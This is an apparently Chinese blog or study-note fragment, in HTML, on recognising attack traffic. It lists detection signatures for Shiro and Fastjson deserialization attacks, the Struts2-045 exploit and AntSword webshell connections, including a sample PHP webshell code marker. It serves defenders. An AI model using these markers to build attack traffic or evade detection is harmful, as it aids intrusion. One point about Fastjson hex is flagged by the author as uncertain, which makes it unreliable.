+<h4 id="redis未授权与权限获取"><a href="#redis未授权与权限获取" class="headerlink" title="redis未授权与权限获取"></a>redis未授权与权限获取</h4><h2 id="常见反序列化流量特征"><a href="#常见反序列化流量特征" class="headerlink" title="常见反序列化流量特征"></a>常见反序列化流量特征</h2><p>shiro就看cookie中Rememberme字段，什么都要从这⾥传</p>
 <p>fastjson：可以在提交的包中找找json格式的数据，重点看⼀下有⽆rmi或者出⽹的⼀些⾏  为，（在⼗六进制中会呈现ACED开头，这段不确定）</p>
 <p>st2-045：请求头中的Content-Type字段</p>
 <h2 id="webshell工具流量特征"><a href="#webshell工具流量特征" class="headerlink" title="webshell工具流量特征"></a>webshell工具流量特征</h2><h4 id="蚁剑（PHP用base64加密）"><a href="#蚁剑（PHP用base64加密）" class="headerlink" title="蚁剑（PHP用base64加密）"></a>蚁剑（<strong>PHP用base64加密</strong>）</h4><p>将蚁剑的正文内容进行URL解码后，流量最中明显的特征为<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</code>这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码，但是有的客户端会将这段编码或者加密，而蚁剑是明文，所以较好发现，同时蚁剑也有eval这种明显的特征。</p>
